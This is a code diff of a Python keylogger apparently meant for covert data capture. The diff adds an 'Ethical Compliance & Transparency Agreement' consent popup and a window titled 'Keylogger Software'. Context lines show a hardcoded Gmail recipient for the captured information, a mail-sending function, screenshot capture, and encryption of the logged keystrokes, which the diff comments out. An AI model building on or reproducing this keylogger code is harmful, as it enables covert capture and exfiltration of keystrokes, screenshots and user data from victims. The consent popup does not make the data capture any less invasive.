@@ -40,42 +40,64 @@ username = getpass.getuser()
 
 toaddr = "kodiugos@gmail.com"  # Enter the email address you want to send your information to
 
+
 import tkinter as tk
-from tkinter import ttk
+from tkinter import scrolledtext
+from tkinter import messagebox
 
+def show_legal_popup():
+    # Create main window
+    legal_window = tk.Toplevel(root)
+    legal_window.title("Ethical Compliance & Transparency Agreement")
 
-def submit():
-    # You can customize this function to handle the submission logic
-    if license_var.get() and terms_var.get():
-        print("License Agreement and Terms of Conditions accepted.")
-        # Add your logic here
-        root.destroy()
-    else:
-        print("Please accept both License Agreement and Terms of Conditions.")
+    # Get the screen width and height
+    screen_width = legal_window.winfo_screenwidth()
+    screen_height = legal_window.winfo_screenheight()
 
+    # Calculate the center position
+    x = int((screen_width - 500) / 2)
+    y = int((screen_height - 400) / 2)
 
-# Create the main window
+    # Set the popup window size and position
+    legal_window.geometry(f"500x400+{x}+{y}")
+
+    # Text widget for legal terms
+    legal_text = scrolledtext.ScrolledText(legal_window, width=50, height=15, wrap=tk.WORD)
+    legal_text.insert(tk.INSERT, """
+    Ethical Compliance & Transparency Agreement:
+
+    By using this software, you agree to comply with ethical standards and transparency principles. This includes:
+
+    1. Acknowledging the presence and purpose of the monitoring activities.
+    2. Ensuring compliance with relevant privacy laws and regulations.
+    3. Respecting user privacy and obtaining explicit consent before initiating monitoring.
+    4. Implementing robust security measures to protect captured data.
+    5. Minimizing the impact on system performance and user experience.
+
+    Your consent to these terms is required for the ethical and responsible use of this software.
+
+    Do you agree to comply with these ethical and transparency standards?
+
+    """)
+
+    legal_text.pack()
+
+    # Buttons for consent and disagreement
+    consent_button = tk.Button(legal_window, text="I Agree", command=legal_window.destroy)
+    consent_button.pack(side=tk.LEFT, padx=10)
+
+    disagree_button = tk.Button(legal_window, text="I Disagree", command=root.destroy)
+    disagree_button.pack(side=tk.RIGHT, padx=10)
+
+# Create main window
 root = tk.Tk()
-root.title("License Agreement and Terms")
+root.title("Keylogger Software")
 
-# Create variables for checkboxes
-license_var = tk.BooleanVar()
-terms_var = tk.BooleanVar()
+# Button to show legal agreement popup
+legal_button = tk.Button(root, text="Show Legal Agreement", command=show_legal_popup)
+legal_button.pack()
 
-# Create and place checkboxes
-license_checkbox = ttk.Checkbutton(root, text="I accept the License Agreement", variable=license_var)
-terms_checkbox = ttk.Checkbutton(root, text="I accept the Terms of Conditions", variable=terms_var)
-
-license_checkbox.pack(pady=10)
-terms_checkbox.pack(pady=10)
-
-# Create and place submit button
-submit_button = ttk.Button(root, text="Submit", command=submit)
-submit_button.pack(pady=20)
-
-# Start the Tkinter event loop
 root.mainloop()
-
 
 # email controls
 def send_mail(
@@ -174,15 +196,8 @@ screenshot()
 # currentTime = time.time()
 # stoppingTime = time.time() + time_iteration
 
-encrypted_file_name = file_merge + keys_information_e
+# input_file = file_merge + keys_information_e
 
-with open(encrypted_file_name, 'rb') as f:
-    data = f.read()
 
-fernet = Fernet(key)
-encrypted = fernet.encrypt(data)
-
-with open(encrypted_file_name, 'wb') as f:
-    f.write(encrypted)
 
 # send_email(encrypted_file_name, toaddr)
